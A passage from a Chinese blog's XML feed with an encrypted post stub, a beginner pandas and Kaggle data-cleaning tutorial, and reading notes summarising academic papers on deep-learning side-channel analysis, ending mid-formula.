  <script id="hbeData" type="hbeData" data-hmacdigest="ec7838b3b6e43ed2283d5a867d9eb521d413f63e8105c661ebb51cb988a3ff41">f489e073913c83118513ae835244118e0f11c7735e9aaae4a8a95d8b023a2670cf0f5ef71fd93dea343885fa8665a2b92b495f76bb1778e4a05fb03e2225a2f8238e31b95a323ff24f4e4013813079d53d7006b390241ff0cf0f4f16df1b85a48d2ff061ea7d213a53402c20aa9912d2b97079e0886189df7cfd0a972634bf94da565ab3d07b45c7642cf78289604f7a3475521b2539f47fbc9613f73e4c3a14b103e2b1f54fc31d9dbbf4e68bc1b9c19c52e192c2bb34c5ebe2b400fc347a8719d3f19cec7861902c679869cbdb6c0791d5f70e11f873e9fdfb2a19ae1c6c7f7d9e0de5fc2b23ef40f7254bef236ef3b471ba5904d5e2102ae6c902724eb61bfcf573a02c6ae91932c415bc33045f9e9c85625ce77fc64c41a865aac69c68a1efb7f55a0fbd09e86e921c122df5b08df8a2cc92eb8960b6e4fefbf3ef0f7af2d20ff3127a9466867d6bc5f0ddd40164f7511d96101aab57392aca4199320ac5019caba564aa4a0399e1f49a9fbd5246e15a9700e522f7adcd273166463e443b21388344318c3a458498c862d1be11d53c4e7a62d80fb2f46bb8e9af2cb1f6dc2bb6de614328175c317786f9c1ff330f75cdfb85f145d7d73804d84e01e432cc2e3d30f0f3e55ffca208238164728d09aa33cc029f00f21b6e74ec2fd2bd80f58b0d1d51bb87dc185e660c2798ebcad16736978dde6ba4411d48c49ea12371c4b8d9742432c8c8c3805021b31672c75ec096ee7e07faba7b190b37818814802c611d12cfb4ad9defce38e20573fe6ceff95dd31c35bccab0303e409242ae0163cb09443c68496401d9bba2c365b2e200e4923330fdba1454dc27845110f36d70b172b283f28bbf6decc8b669d8e6f26f839399c967d42d78f0cbdffaa13a6ae9a859dc3662db1670a6eaef0dc2a4b73dd43388b7eef702a0172599f5539063d4f5d3442f284476533e6af8b9a95c61be7e0f152cd9134194d0526dce5b3c0643bf278fbf70eea80a5928e3a71a78a6bb8249f065b6011acda86d3099585f2e4c235ae1b8f423f244ed3053aaf4f23da5</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-blink">
      <input class="hbe hbe-input-field hbe-input-field-blink" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-blink" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-blink" data-content="这里需要密码,Pay for me !!!.">这里需要密码,Pay for me !!!.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>基于深度学习的侧信道攻击</category>
      </categories>
      <tags>
        <tag>兴趣点选择</tag>
      </tags>
  </entry>
  <entry>
    <title>从零开始的Kaggle之旅</title>
    <url>/archives/9d627a55.html</url>
    <content><![CDATA[<p><strong>写在前面</strong></p>
<blockquote>
<p>Kaggle只是迫不得已，真要学害得是我CTF！</p>
</blockquote>
<h1>EDA（Exploratory Data Analysis）</h1>
<h2 id="加载数据">加载数据</h2>
<p>在实际环境中，training data一般都有许多列，并不是所有的特征都会对最终的target有影响（影响因子较小甚至可以忽略），有的特征还存在负影响或者None值，此时需要对所有特征进行过滤或者修改。</p>
<h3 id="Pandas"><strong>Pandas</strong></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br></pre></td></tr></table></figure>
<h4 id="read-csv">read_csv</h4>
<blockquote>
<p>读取csv文件</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path = bulabula</span><br><span class="line">data = pd.read_csv(path)</span><br></pre></td></tr></table></figure>
<h4 id="columns">columns</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data.columns</span><br></pre></td></tr></table></figure>
<p>输出如下，将每列的name打印出来（例子</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">Index(<span class="punctuation">[</span>&#x27;Suburb&#x27;<span class="punctuation">,</span> &#x27;Address&#x27;<span class="punctuation">,</span> &#x27;Rooms&#x27;<span class="punctuation">,</span> &#x27;Type&#x27;<span class="punctuation">,</span> &#x27;Price&#x27;<span class="punctuation">,</span> &#x27;Method&#x27;<span class="punctuation">,</span> &#x27;SellerG&#x27;<span class="punctuation">,</span></span><br><span class="line">       &#x27;Date&#x27;<span class="punctuation">,</span> &#x27;Distance&#x27;<span class="punctuation">,</span> &#x27;Postcode&#x27;<span class="punctuation">,</span> &#x27;Bedroom2&#x27;<span class="punctuation">,</span> &#x27;Bathroom&#x27;<span class="punctuation">,</span> &#x27;Car&#x27;<span class="punctuation">,</span></span><br><span class="line">       &#x27;Landsize&#x27;<span class="punctuation">,</span> &#x27;BuildingArea&#x27;<span class="punctuation">,</span> &#x27;YearBuilt&#x27;<span class="punctuation">,</span> &#x27;CouncilArea&#x27;<span class="punctuation">,</span> &#x27;Lattitude&#x27;<span class="punctuation">,</span></span><br><span class="line">       &#x27;Longtitude&#x27;<span class="punctuation">,</span> &#x27;Regionname&#x27;<span class="punctuation">,</span> &#x27;Propertycount&#x27;<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      dtype=&#x27;object&#x27;)</span><br></pre></td></tr></table></figure>
<h4 id="针对缺失值的行">针对缺失值的行</h4>
<h5 id="dropna">dropna</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data.dropna(axis=<span class="number">0</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">将data中某列为Na的行删掉</span></span><br><span class="line"><span class="string">例如：</span></span><br><span class="line"><span class="string">|a|Na|				|b|123|</span></span><br><span class="line"><span class="string">				----&gt;</span></span><br><span class="line"><span class="string">|b|123|</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="展示列属性">展示列属性</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> data.columns:</span><br><span class="line">  <span class="built_in">print</span>(col, data[col].dtype)</span><br></pre></td></tr></table></figure>
<img src="../img/image-20240304155612527.png" alt="image-20240304155612527" style="zoom:67%;" />
<h4 id="展示某列">展示某列</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data.Suburb</span><br><span class="line">data[<span class="string">&#x27;Suburb&#x27;</span>]</span><br><span class="line"><span class="comment">## 多列</span></span><br><span class="line">data[[<span class="string">&#x27;Suburb&#x27;</span>, <span class="string">&#x27;Address&#x27;</span>, <span class="string">&#x27;Rooms&#x27;</span>]]</span><br></pre></td></tr></table></figure>
<h4 id="describe">describe</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data.describe()</span><br></pre></td></tr></table></figure>
<img src="../img/image-20240229111532666.png" alt="描述" style="zoom:50%;" />
<h2 id="Missing-Value">Missing Value</h2>
<h3 id="检查是否为Nan">检查是否为Nan</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data[<span class="string">&#x27;列名&#x27;</span>].isnull().<span class="built_in">any</span>     <span class="literal">True</span>有Nan值，<span class="literal">False</span>无</span><br></pre></td></tr></table></figure>
<h3 id="取平均">取平均</h3>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">在该列为连续型随机变量时，可以考虑直接拿中间值</span><br><span class="line">计算该列所有值，取平均数填入缺失值</span><br></pre></td></tr></table></figure>
<h2 id="取最大频次">取最大频次</h2>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">在针对离散型随机变量时，取出现频率最多的值</span><br></pre></td></tr></table></figure>
<h3 id="特殊值法">特殊值法</h3>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">直接填入不可能的值</span><br><span class="line">例：年龄=0， -1</span><br></pre></td></tr></table></figure>
<h3 id="SimpleImputer">SimpleImputer</h3>
<blockquote>
<p>处理无效值api</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.impute <span class="keyword">import</span> SimpleImputer</span><br><span class="line">my_imputer = SimpleImputer()</span><br><span class="line">my_imputer.fit_transform(x_train)</span><br></pre></td></tr></table></figure>
<h1>Model</h1>
<h2 id="决策树-DecisionTreeRegressor">决策树 DecisionTreeRegressor</h2>
]]></content>
      <tags>
        <tag>kaggle</tag>
      </tags>
  </entry>
  <entry>
    <title>文献阅读笔记-Pay Attention to Raw Traces: A Deep Learning Architecture for End-to-End Profiling Attacks Analysis</title>
    <url>/archives/73861951.html</url>
    <content><![CDATA[<h1>文章信息</h1>
<ul>
<li>作者：<strong>Xiangjun Lu, Chi Zhang, Pei Cao, Dawu Gu, Haining Lu</strong></li>
<li>单位：<strong>Shanghai Jiao Tong University, Shanghai, China</strong></li>
<li>出处：<strong>IACR Transactions on Cryptographic Hardware and Embedded Systems</strong></li>
<li>标题：<strong>Pay Attention to Raw Traces: A Deep Learning Architecture for End-to-End Profiling Attacks</strong></li>
<li>日期：<strong>2021年7月9日</strong></li>
</ul>
<h1>研究背景</h1>
<p>深度神经网络与侧信道攻击相结合对加密设备造成了巨大的威胁，但大部分文章都是基于一个假设前提，即攻击者攻击的兴趣点区间是基于先验知识挑选出来的，为了完全基于黑盒对设备发起侧信道攻击，作者直接将原始能量迹作为输入来完成“端到端”的侧信道攻击。</p>
<h1>文章内容</h1>
<h2 id="本文贡献">本文贡献</h2>
<ol>
<li>提供了针对不同数据集端到端建模攻击的模型框架</li>
<li>探索了<strong>注意力机制</strong>在侧信道攻击中的作用</li>
<li>公开了一个数据集</li>
</ol>
<h2 id="模型整体架构">模型整体架构</h2>
<p>在本文中作者将自编码器（Encoder层）、注意力机制、区分器（CNN、MLP）融合在一起，以此来发动对原始能量迹的攻击。</p>
<p>自编码器层（堆叠自编码器LC层组合）</p>
<p><img src="../img/image-20240526163845827.png" alt="图1 模型架构"></p>
<h2 id="研究思路">研究思路</h2>
<p>作者认为在worse case下，如果硬件设备上了掩码（N阶）会导致攻击者需要一段很长的时间样本序列来进行分析，目前已有许多工作利用CNN、MLP等深度学习方法来完成在指定数据集上的攻击，但是现实场景下能量迹的数量如DPAv4.2有超过1,600,000个样本点，ASCAD有250,000个样本点（原文的话），如果此时攻击者无法基于灰盒模式对能量迹进行兴趣点区间的提取，那么考虑对原始能量迹发起端到端攻击是有意义的。</p>
<p>此外，MLP在特征数量过高的时候会有过拟合风险，CNN在针对高维数据构建多层网络时设计较为棘手，为此作者提出四点设计原则：</p>
<ol>
<li>避免在高维层之间使用全连接层</li>
<li>避免对高维数据扩大特征维度</li>
<li>前几层应做特征提取</li>
<li>分类器之前的层应能够提取出细粒度的特征</li>
</ol>
<h3 id="（局部连接）LC层与卷积层">（局部连接）LC层与卷积层</h3>
<p>如图2所示，由于在滑动滤波器时起始位置和设备的时钟周期不一定总是对齐的，从而导致预期位置与实际位置不同，由于偏差的影响，卷积层无法共享同一个权重，但是步长为<strong>1</strong>的情况下可以提取去同步的特征。</p>
<p>LC层进关注独立的区域，不会受到距离较远的噪声的影响，即仅关注小范围区间。</p>
<p><img src="../img/image-20240526164227879.png" alt="图2  多个时钟周期下滤波器起始位置与预期位置偏差"></p>
<h3 id="LSTM">LSTM</h3>
<p>用的seq2seq模式构建lstm的模型，没有实现过先不展开。</p>
<h3 id="Attention">Attention</h3>
<p>本人认为比较重要的就是注意力这块，在经过上层编码器Encode之后的&quot;Embeddings&quot;仍然对应有不同的权重，即存在噪声特征，在LSTM前我们必须对提取到的这些特征分配不同的权重，是模型关注重要泄漏点，本文使用了Bahdanau等人<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>提出的模型，此外，作者认为在编码器之后使用注意力机制是不合适的。</p>
<h3 id="分类器架构">分类器架构</h3>
<p><img src="../img/image-20240526164323804.png" alt="图3  针对不同Attention方案 两种分类器架构图"></p>
<h1>实验结果</h1>
<p><img src="../img/image-20240605112518497.png" alt="表1 不同数据集实验结果"></p>
<p>在同步数据集上结果</p>
<p><img src="../img/image-20240526164353621.png" alt="图4 DPAv4.1"></p>
<p><img src="../img/image-20240526164441038.png" alt="DPAv4.2"></p>
<p><img src="../img/image-20240526164534302.png" alt="ASCADv1"></p>
<p><img src="../img/image-20240526164539363.png" alt="image-20240526164539363"></p>
<p><img src="../img/image-20240605112734854.png" alt="AT128两种不同泄露距离的攻击效果（上近下远）"></p>
<p><img src="../img/image-20240526164633437.png" alt="LC层不同滤波器大小对攻击效果的影响"></p>
<p><img src="../img/image-20240526164639962.png" alt="ASCADv1与ASCADv2上不同随机延迟窗口对攻击效果的影响"></p>
<p><img src="../img/image-20240526164652334.png" alt="AT128上不同随机延迟窗口对攻击效果的影响"></p>
<p><img src="../img/image-20240526164741125.png" alt="AT128上信噪比、梯度、注意力概率分布"></p>
<p><img src="../img/image-20240526164751246.png" alt="ASCADv1上信噪比、梯度、注意力概率分布"></p>
<p>这里我并没有做过类似的实验，可能图标题有误，但是这个实验可以尝试集成到mlscat里，在写writing时充任务量。</p>
<p><img src="../img/image-20240526164759496.png" alt="LSTM中注意力概率与输入门活跃单元"></p>
<h1>总结</h1>
<p>本文提供了一个端到端的侧信道攻击框架，攻击者仅需输入一条原始能量迹即可完成对某一字节的攻击。</p>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p>Bahdanau D, Cho K, Bengio Y. Neural machine translation by jointly learning to align and translate[J]. arXiv preprint <a href="https://arxiv.org/abs/1409.0473">arXiv:1409.0473</a><img src="data:image/png;base64,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" alt="img">, 2014. <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>基于深度学习的侧信道攻击</category>
      </categories>
      <tags>
        <tag>模型架构</tag>
      </tags>
  </entry>
  <entry>
    <title>文献阅读笔记-Breaking Free: Leakage Model-free Deep Learning-based Side-channel Analysis</title>
    <url>/archives/b232a139.html</url>
    <content><![CDATA[<h1>文章信息</h1>
<ul>
<li>
<p>作者：<strong>Lichao Wu, Amir Ali-pour, Azade Rezaeezade, Guilherme Perin and Stjepan Picek</strong></p>
</li>
<li>
<p>单位：<strong>Radboud University, The Netherlands  Delft University of Technology, The Netherlands  Leiden University, The Netherlands  Independent Researcher</strong></p>
</li>
<li>
<p>出处：<strong>Eprint</strong></p>
</li>
<li>
<p>标题：<strong>Breaking Free: Leakage Model-free Deep Learning-based Side-channel Analysis</strong></p>
</li>
<li>
<p>日期：<strong>2023年7月17日</strong></p>
</li>
</ul>
<h1>背景</h1>
<p>现如今基于深度学习结合侧信道攻击已经成为了较为强大的攻击手段，攻击者将采集到的原始能量迹经预处理后的兴趣点作为特征，选择的算法某一处泄露的中间值作为标签来完成攻击。通常，研究人员通过汉明重量或身份等泄露模型来完成对标签的刻画，然而在实际攻击环境中，采用这种预设的泄露模型可能会得到较差的性能<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>。</p>
<h1>文章内容</h1>
<h2 id="字节建模">字节建模</h2>
<p>假设密钥为$$k^*$$, 对应第i个密钥、（明文或密文）字节为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>k</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>d</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">k_i, d_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span 